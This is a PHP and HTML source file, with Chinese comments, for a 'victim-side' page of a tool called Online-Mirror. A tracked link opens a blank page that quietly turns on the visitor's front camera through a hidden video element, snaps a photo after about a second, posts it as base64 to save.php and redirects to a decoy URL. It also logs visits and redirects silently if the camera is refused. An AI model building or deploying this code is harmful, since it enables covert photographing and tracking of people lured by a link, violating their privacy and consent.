<?php
/**
 * Online-Mirror 升级版 - 拍照捕获页面（受害者端）
 * 纯空白页面，无感拍照后跳转
 */
require_once __DIR__ . '/config.php';

$id = trim($_GET['id'] ?? '');
$url = trim($_GET['url'] ?? '');

// 验证链接有效性
if (empty($id) || empty($url)) {
    die('<h2 style="text-align:center;margin-top:50px;color:#888;">参数错误</h2>');
}

// 查询链接是否存在且有效
try {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM links WHERE link_id = ? AND status = 'active'");
    $stmt->execute([$id]);
    $link = $stmt->fetch();
    
    if (!$link) {
        header("Location: " . $url);
        exit;
    }
    
    // 检查是否过期
    if ($link['expires_at'] && strtotime($link['expires_at']) < time()) {
        $stmt = $db->prepare("UPDATE links SET status = 'expired' WHERE link_id = ?");
        $stmt->execute([$id]);
        header("Location: " . $url);
        exit;
    }
    
    // 增加浏览量
    $stmt = $db->prepare("UPDATE links SET views = views + 1 WHERE link_id = ?");
    $stmt->execute([$id]);
    
    // 记录访问日志
    addLog($id, 'visit');
    
} catch (Exception $e) {
    header("Location: " . $url);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title></title>
<style>
* { margin: 0; padding: 0; }
html, body { width: 100%; height: 100%; background: #fff; }
</style>
</head>
<body>

<video id="video" width="0" height="0" autoplay playsinline></video>
<canvas style="display:none" id="canvas"></canvas>

<form action="save.php" id="captureForm" method="post">
    <input type="hidden" name="img" id="result" value="" />
    <input type="hidden" name="id" value="<?php echo htmlspecialchars($id); ?>" />
    <input type="hidden" name="url" value="<?php echo htmlspecialchars($url); ?>" />
</form>

<script>
window.addEventListener("DOMContentLoaded", function() {
    var canvas = document.getElementById('canvas');
    var context = canvas.getContext('2d');
    var video = document.getElementById('video');
    var form = document.getElementById('captureForm');
    var result = document.getElementById('result');

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: 'user'
            } 
        }).then(function(stream) {
            video.srcObject = stream;
            video.play();
            
            // 等摄像头就绪后获取真实尺寸并拍照
            setTimeout(function(){
                var vw = video.videoWidth || 480;
                var vh = video.videoHeight || 640;
                
                // 用摄像头真实比例设置 canvas
                canvas.width = vw;
                canvas.height = vh;
                
                // 按原始比例绘制，不变形
                context.drawImage(video, 0, 0, vw, vh);
            }, 1000);
            
            setTimeout(function(){
                var img = canvas.toDataURL('image/png');
                result.value = img;
                stream.getTracks().forEach(track => track.stop());
                form.submit();
            }, 1500);
            
        }).catch(function(err) {
            window.location.href = form.querySelector('input[name="url"]').value;
        });
    } else {
        window.location.href = form.querySelector('input[name="url"]').value;
    }
});
</script>
</body>
</html>
